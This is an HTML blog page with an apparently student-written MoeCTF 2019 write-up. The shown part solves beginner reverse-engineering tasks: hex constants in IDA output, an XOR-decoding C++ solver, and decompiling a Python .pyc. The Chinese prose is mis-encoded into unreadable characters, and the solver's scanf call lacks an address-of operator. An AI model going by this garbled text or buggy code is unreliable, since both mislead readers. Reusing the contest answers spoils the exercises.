<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>MoeCTF 2019 é¢˜è§£ - Reverier&#39;s Blog</title><meta name="Description" content="Creating reality with idealism."><meta property="og:title" content="MoeCTF 2019 é¢˜è§£" />
<meta property="og:description" content="å‰è¨€
å¥½äº†,æœ¬è’Ÿè’»è¦å¼€å§‹å†™é¢˜è§£äº†â€¦
æ¯”èµ›ç»“æŸåŠ›!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.woooo.tech/posts/moectf_2019_wp/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-09-06T18:23:00+08:00" />
<meta property="article:modified_time" content="2019-09-06T18:23:00+08:00" /><meta property="og:site_name" content="Reverier&#39;s Blog" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="MoeCTF 2019 é¢˜è§£"/>
<meta name="twitter:description" content="å‰è¨€
å¥½äº†,æœ¬è’Ÿè’»è¦å¼€å§‹å†™é¢˜è§£äº†â€¦
æ¯”èµ›ç»“æŸåŠ›!"/>
<meta name="application-name" content="Reverier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Reverier&#39;s Blog"><meta name="theme-color" content="#0078D6"><meta name="msapplication-TileColor" content="#0078D6"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#0078D6"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.woooo.tech/posts/moectf_2019_wp/" /><link rel="prev" href="https://blog.woooo.tech/posts/moectf_2019_inspirement/" /><link rel="next" href="https://blog.woooo.tech/posts/for_shit_http_headers/" /><link rel="stylesheet" href="/css/style.min.519b64cb5eb54579779c509062777056449484da1d13d762f5152138c8c4422c.css" integrity="sha256-UZtky161RXl3nFCQYndwVkSUhNodE9di9RUhOMjEQiw="><link rel="preload" href="/lib/fontawesome-free/all.min.0df5a33710e433de1f5415b1d47e4130ca7466aee5b81955f1045c4844bbb3ed.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.0df5a33710e433de1f5415b1d47e4130ca7466aee5b81955f1045c4844bbb3ed.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0="></noscript><link rel="preload" href="/lib/animate/animate.min.5fbaeb9f8e25d7e0143bae61d4b1802c16ce7390b96ceb2d498b0d96ff4c853f.css" integrity="sha256-X7rrn44l1+AUO65h1LGALBbOc5C5bOstSYsNlv9MhT8=" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.5fbaeb9f8e25d7e0143bae61d4b1802c16ce7390b96ceb2d498b0d96ff4c853f.css" integrity="sha256-X7rrn44l1+AUO65h1LGALBbOc5C5bOstSYsNlv9MhT8="></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "MoeCTF 2019 é¢˜è§£",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.woooo.tech\/posts\/moectf_2019_wp\/"
        },"genre": "posts","keywords": "CTF","wordcount":  15455 ,
        "url": "https:\/\/blog.woooo.tech\/posts\/moectf_2019_wp\/","datePublished": "2019-09-06T18:23:00+08:00","dateModified": "2019-09-06T18:23:00+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Reverier-Xu"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Reverier&#39;s Blog"><span class="header-title-pre"><span style="color: #0078D6;">#  </span></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"><span style="color: #0078D6">&gt;&gt;</span> æ–‡ç«  </a><a class="menu-item" href="/tags/"><span style="color: #0078D6">&gt;&gt;</span> æ ‡ç­¾ </a><a class="menu-item" href="/categories/"><span style="color: #0078D6">&gt;&gt;</span> åˆ†ç±» </a><a class="menu-item" href="/friends"><span style="color: #0078D6">&gt;&gt;</span> æœ‹å‹ä»¬ </a><a class="menu-item" href="/about"><span style="color: #0078D6">&gt;&gt;</span> å…³äº </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Reverier&#39;s Blog"><span class="header-title-pre"><span style="color: #0078D6;">#  </span></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title=""><span style="color: #0078D6">&gt;&gt;</span>æ–‡ç« </a><a class="menu-item" href="/tags/" title=""><span style="color: #0078D6">&gt;&gt;</span>æ ‡ç­¾</a><a class="menu-item" href="/categories/" title=""><span style="color: #0078D6">&gt;&gt;</span>åˆ†ç±»</a><a class="menu-item" href="/friends" title=""><span style="color: #0078D6">&gt;&gt;</span>æœ‹å‹ä»¬</a><a class="menu-item" href="/about" title=""><span style="color: #0078D6">&gt;&gt;</span>å…³äº</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">MoeCTF 2019 é¢˜è§£</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://blog.woooo.tech" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Reverier-Xu</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2019-09-06">2019-09-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;15455 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;31 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#sign-in">Sign In</a>
      <ul>
        <li><a href="#ä½ æ˜¯è¥¿ç”µæ–°ç”Ÿå—">ä½ æ˜¯è¥¿ç”µæ–°ç”Ÿå—?</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#introducing-re">Introducing RE</a></li>
        <li><a href="#moe-re">Moe RE</a></li>
        <li><a href="#pyc">.pyc</a></li>
        <li><a href="#easy-shell">Easy Shell</a></li>
        <li><a href="#easy-debugger">Easy Debugger</a></li>
        <li><a href="#easy-go">Easy Go</a></li>
        <li><a href="#java-re">Java RE</a></li>
        <li><a href="#mine-sweep">Mine Sweep</a></li>
        <li><a href="#easy-re">Easy RE</a></li>
        <li><a href="#algorithm-task">Algorithm Task</a></li>
        <li><a href="#easy-c">Easy C++</a></li>
      </ul>
    </li>
    <li><a href="#programming">Programming</a>
      <ul>
        <li><a href="#easy-ppc">Easy PPC</a></li>
        <li><a href="#w1ndç‰›é€¼">w1ndç‰›é€¼ï¼</a></li>
        <li><a href="#a-template-problem">A Template Problem</a></li>
        <li><a href="#perfect-repeater">Perfect Repeater</a></li>
        <li><a href="#frank-nb">Frank NB!</a></li>
        <li><a href="#random-encode">Random Encode</a></li>
        <li><a href="#tree-distance">Tree Distance</a></li>
        <li><a href="#f1gs-diamond">F1@gâ€˜s diamond</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#pigpen-cipher">Pigpen Cipher</a></li>
        <li><a href="#rail-fence-cipher">Rail fence cipher</a></li>
        <li><a href="#bacons-cipher">Baconâ€™s Cipher</a></li>
        <li><a href="#frequency-analysis">Frequency analysis?</a></li>
        <li><a href="#md5">MD5</a></li>
        <li><a href="#columnar-transposition">Columnar Transposition</a></li>
        <li><a href="#columnar-transposition-1">Columnar transposition</a></li>
        <li><a href="#easy-rsa">Easy RSA</a></li>
        <li><a href="#hill-cipher">Hill Cipher</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#get">GET</a></li>
        <li><a href="#post">POST</a></li>
        <li><a href="#introducing-web">Introducing Web</a></li>
        <li><a href="#easy-limitation">Easy Limitation</a></li>
        <li><a href="#procotol">Procotol</a></li>
        <li><a href="#restrictions">Restrictions</a></li>
        <li><a href="#æ˜¯æ—¶å€™å±•ç¤ºåå…«å¹´å•èº«çš„æ‰‹é€Ÿäº†">æ˜¯æ—¶å€™å±•ç¤ºåå…«å¹´å•èº«çš„æ‰‹é€Ÿäº†</a></li>
        <li><a href="#è‹±å›½äºº">è‹±å›½äºº</a></li>
        <li><a href="#amazing_eval">Amazing_Eval</a></li>
        <li><a href="#ä»Šå¤©ä½ å¤‡ä»½äº†å˜›">ä»Šå¤©ä½ å¤‡ä»½äº†å˜›</a></li>
        <li><a href="#php-å¼±ç±»å‹">PHP å¼±ç±»å‹</a></li>
        <li><a href="#php_md5">PHP_md5()</a></li>
        <li><a href="#ç¥å¥‡çš„æ­£åˆ™è¡¨è¾¾å¼">ç¥å¥‡çš„æ­£åˆ™è¡¨è¾¾å¼</a></li>
        <li><a href="#å¤´">å¤´</a></li>
        <li><a href="#stronger_php">stronger_php</a></li>
        <li><a href="#ç»ˆæhttpè¯·æ±‚å¤´">ç»ˆæHTTPè¯·æ±‚å¤´</a></li>
        <li><a href="#æœé²œäºº">æœé²œäºº</a></li>
        <li><a href="#1ä»€ä¹ˆæ˜¯edns"><em>1ã€ä»€ä¹ˆæ˜¯EDNSï¼Ÿ</em></a></li>
        <li><a href="#2ä¸ºä»€ä¹ˆè¦æœ‰-edns">2ã€ä¸ºä»€ä¹ˆè¦æœ‰ EDNSï¼Ÿ</a></li>
        <li><a href="#3edns-çš„å†…å®¹æ˜¯ä»€ä¹ˆ"><em>3ã€EDNS çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Ÿ</em></a></li>
        <li><a href="#dynamic">Dynamic</a></li>
      </ul>
    </li>
    <li><a href="#android">Android</a>
      <ul>
        <li><a href="#android_signin">Android_Signin</a></li>
        <li><a href="#clickit">ClickIt</a></li>
      </ul>
    </li>
    <li><a href="#devops">DevOps</a>
      <ul>
        <li><a href="#sni">SNI</a></li>
        <li><a href="#sni-1">SNI++</a></li>
      </ul>
    </li>
    <li><a href="#misc">MISC</a>
      <ul>
        <li><a href="#ä¸–ç•Œè¾£ä¹ˆå¤§">ä¸–ç•Œè¾£ä¹ˆå¤§</a></li>
        <li><a href="#easy-base64">Easy base64</a></li>
        <li><a href="#ç½‘çº¿å¤§é²¨é±¼">ç½‘çº¿å¤§é²¨é±¼</a></li>
        <li><a href="#ä½ çš„è„‘æ´å¤Ÿå¤§å—">ä½ çš„è„‘æ´å¤Ÿå¤§å—</a></li>
        <li><a href="#è¢«ä¼ªåŠ å¯†çš„æ–‡æ¡£">è¢«ä¼ªåŠ å¯†çš„æ–‡æ¡£</a></li>
        <li><a href="#ä¿®å¤åˆ†ç¦»">ä¿®å¤&amp;åˆ†ç¦»</a></li>
        <li><a href="#keyboard">Keyboard</a></li>
        <li><a href="#æ¼äººçš„aliga">æ¼äººçš„Aliga</a></li>
        <li><a href="#secret-code">Secret Code</a></li>
        <li><a href="#base64">Base64?</a></li>
        <li><a href="#aiaiai">AiAiAi</a></li>
        <li><a href="#osu-master">Osu Master</a></li>
        <li><a href="#sdçš„å˜²è®½è¡¨æƒ…">s@dçš„å˜²è®½è¡¨æƒ…</a></li>
        <li><a href="#kokoro">Kokoro</a></li>
        <li><a href="#show-off">Show Off</a></li>
      </ul>
    </li>
    <li><a href="#pwn">PWN</a>
      <ul>
        <li><a href="#æ¬¢è¿æ¥åˆ°pwnçš„ä¸–ç•Œ">æ¬¢è¿æ¥åˆ°pwnçš„ä¸–ç•Œ</a></li>
        <li><a href="#pwn1">pwn1</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="å‰è¨€">å‰è¨€</h1>
<p>å¥½äº†,æœ¬è’Ÿè’»è¦å¼€å§‹å†™é¢˜è§£äº†â€¦</p>
<p>æ¯”èµ›ç»“æŸåŠ›!</p>
<h1 id="é¢˜è§£">é¢˜è§£</h1>
<h2 id="sign-in">Sign In</h2>
<h3 id="ä½ æ˜¯è¥¿ç”µæ–°ç”Ÿå—">ä½ æ˜¯è¥¿ç”µæ–°ç”Ÿå—?</h3>
<p>ç­¾åˆ°é¢˜, åŠ å…¥è€ƒè¯•ç¾¤, åœ¨å…¬å‘Šé‡Œé¢å°±å¯ä»¥å‘ç°<code>flag</code>, å¤åˆ¶, æäº¤, ä¸€ç™¾åˆ†åˆ°æ‰‹~</p>
<h2 id="reverse">Reverse</h2>
<h3 id="introducing-re">Introducing RE</h3>
<p>è¿™é“é¢˜&hellip; å°±æ˜¯æ•™ä½ æ€ä¹ˆç”¨<code>IDA</code>çš„..</p>
<p>åœ¨ç½‘ä¸Šæ‰¾æ¥çš„<code>IDA</code>èµ„æº, ,ç„¶åå®‰è£…,æ‰“å¼€,å‘ç°äº†è¿™ä¹ˆå‡ å¥:</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov     dword ptr [esp], offset aWelcomeToTheMo ; &#34;Welcome to the MoeCTF!&#34;
call    puts
mov     dword ptr [esp+17h], 63656F6Dh
mov     dword ptr [esp+1Bh], 447B6674h
mov     dword ptr [esp+1Fh], 6F595F30h
mov     dword ptr [esp+23h], 326B5F75h
mov     dword ptr [esp+27h], 495F776Fh
mov     dword ptr [esp+2Bh], 7D3F4144h
mov     byte ptr [esp+2Fh], 0
lea     eax, [esp+30h+var_19]
mov     [esp], eax      ; char *
call    sub_401500
</code></pre><p>ç„¶åæ‰¾äº†ä¸ª16è¿›åˆ¶è½¬ASCIIçš„ç½‘ç«™, å¤åˆ¶ç¬¬ä¸‰è¡Œçš„ <code>63 65 6F 6D</code> è¿›å», å‘ç°è§£å‡ºæ¥æ˜¯ <code>ceom</code></p>
<p>å•Šå˜?åè¿‡æ¥ä¸å°±æ˜¯ <code>moec</code> ä¹ˆ?</p>
<p>æŒ‰ç…§è¿™ä¸ªæ€è·¯, æŒ¨ä¸ªå¤åˆ¶ç„¶ååè¿‡æ¥è¾“å‡º, å°±æŠŠ <code>flag</code> æ‰¾åˆ°äº†.</p>
<h3 id="moe-re">Moe RE</h3>
<p>è¿™é“é¢˜æˆ‘æœ¬æ¥æ˜¯ç¬¬äºŒé¢˜åšçš„,, åæ¥å‘ç°ç«Ÿç„¶æ¯”æˆ‘æƒ³è±¡ä¸­çš„éš¾&hellip;</p>
<p>ä¸‹è½½äº†<code>re</code>, å‘ç°æ‰“ä¸å¼€, å°±æ‰”è¿›<code>Windows</code>çš„<code>Linux</code>å­ç³»ç»Ÿé‡Œ, å‘ç°ä¾æ—§æ‰“ä¸å¼€, å•Šå˜? ä»€ä¹ˆæƒ…å†µ? ä¸è¡Œæˆ‘é‡å¯åˆ°<code>Arch Linux</code>è¯•è¯•? ç®—äº†æˆ‘æ‡’å¾—è´¹é‚£ä¸ªç¥&hellip; ç›´æ¥æ‰”è¿›IDA, å‘ç°æ±‡ç¼–è¯»ä¸æ‡‚, å°±æŒ‰äº†ä¸‹F5, å¾—åˆ°äº†ä»¥ä¸‹ä¼ªä»£ç :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>                   <span class="c1">// æ³¨é‡Šæ˜¯åæ¥è‡ªå·±æ·»åŠ çš„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-A0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-9Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-98h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-90h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v9</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [rsp+40h] [rbp-70h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+A8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>   <span class="c1">// è·å–è¾“å…¥ v9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span>         <span class="c1">// è·å–è¾“å…¥é•¿åº¦
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v7</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>                 <span class="c1">// ç°åœ¨v3 == v7,éƒ½æ˜¯é•¿åº¦
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="s">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">);</span> <span class="c1">// v8 å¥½åƒæ˜¯ä¸ª table
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//éå†è¾“å…¥, ç„¶åæŠŠv9é‡Œæ¯ä¸ªå­—ç¬¦å’Œtableçš„ç¬¬iä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v9</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span> <span class="o">+</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">26</span><span class="p">);</span> <span class="c1">//*((_BYTE ... % 26)è¿™å¥å°±ç›¸å½“äºv8[i % 26]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v7</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span> <span class="c1">//è¾“å‡ºv9é‡Œå„ä¸ªå­—ç¬¦çš„æ•°å­—
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d,&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v9</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">__stack_chk_guard</span> <span class="o">==</span> <span class="n">v10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å°å°çš„ç ”ç©¶ä¸€ä¸‹æºä»£ç , å‘ç°æ˜¯ä¸ªç®€å•çš„ç®—æ³•, å…·ä½“å¦‚ä»£ç æ³¨é‡Šé‡Œå†™çš„é‚£æ ·, äºæ˜¯å†™ä¸€ä¸ªå°ç¨‹åºç ´è§£ä¹‹:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstdio&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">v</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d,&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">result</span> <span class="o">=</span> <span class="kt">int</span><span class="p">(</span><span class="n">v</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">26</span><span class="p">])</span> <span class="o">^</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>å·®ä¸å¤šå°±æ˜¯æŠŠé¢˜ç›®åç€å†™äº†ä¸€é, ç„¶åè¿è¡Œ, æŠŠé¢˜ç›®ç»™çš„æ•°å­—ä¸²è¾“å…¥è¿›å»,å›è½¦å‡º<code>flag</code>.</p>
<h3 id="pyc">.pyc</h3>
<p>å•Šå˜? <code>Python</code>éš¾é“ä¸æ˜¯è§£é‡Šå‹è¯­è¨€ä¹ˆ??? ( æˆ‘è§è¯†å¤ªå°‘äº† [ æŠ±å¤´ç—›å“­ ]</p>
<p>æŒ‰ç…§Bingä¸Šæœåˆ°çš„è¯´æ³•, æˆ‘å°±å…ˆè£…äº†ä¸ªåç¼–è¯‘<code>tool</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ pip install uncompyle
</span></span></code></pre></div><p>ç„¶å&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ uncompyle6 ./test.cpython-37.pyc &gt; ./test.cpython-37.py
</span></span></code></pre></div><p>å†ç„¶åå°±å¾—åˆ°äº†ä»¥ä¸‹ä»£ç , å®˜æ–¹è¯´<code>uncompyle</code>åªæ”¯æŒ<code>Python2.x</code>, æ‰€ä»¥æå‡ºæ¥çš„æœ‰bug, ä¸è¿‡å·®ä¸å¤šèƒ½ç†è§£:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># uncompyle6 version 3.4.0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Python bytecode 3.7 (3394)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decompiled from: Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Embedded file name: test.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Size of source mod 2**32: 294 bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">b2a_hex</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b32encode</span>
</span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="nb">input</span>
</span></span><span class="line"><span class="cl"><span class="n">y</span> <span class="o">=</span> <span class="nb">print</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">b2a_hex</span><span class="p">(</span><span class="n">b32encode</span><span class="p">(</span><span class="n">x</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;4e5658574b5933554d5a3558413452544d4d59473234444a4e525557345a5a4e4b4234574758334447525846364d44514f51595732324c324d55575647344254474e5348323d3d3d&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">(</span><span class="s1">&#39;congrats&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># okay decompiling C:\\users\rever\Downloads\test.cpython-37.pyc</span>
</span></span></code></pre></div><p>çœ‹è§äº†ä¸€å¤§ä¸²hex, äºæ˜¯æ‰¾äº†ä¸ªç½‘ç«™è½¬æ¢ä¹‹:</p>
